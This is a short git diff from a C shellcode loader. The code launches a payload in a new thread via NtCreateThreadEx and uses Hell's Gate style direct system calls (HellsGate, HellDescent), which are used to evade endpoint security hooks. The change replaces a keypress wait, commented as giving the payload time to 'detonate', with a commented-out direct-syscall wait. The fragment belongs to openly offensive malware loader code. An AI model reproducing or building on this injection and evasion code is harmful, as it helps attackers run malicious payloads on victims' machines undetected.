@@ -92,9 +92,12 @@ int main() {
 	// Launch the shellcode in a new thread
 	pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pShellcodeAddress, NULL, NULL, NULL, NULL, NULL, NULL);
 
-	// Using this to give enough time for payload to detonate. Or the main thread will exit prematurely.
-	printf("[#] Press <Enter> To Quit ... ");
-	getchar();
+	// Wait for 1 seconds for the payload to run
+	/*LARGE_INTEGER Timeout;
+	Timeout.QuadPart = -10000000;
+	HellsGate(Table.NtWaitForSingleObject.wSystemCall);
+	STATUS = HellDescent(hThread, FALSE, &Timeout);
+	*/
 
 	return 0;
 }
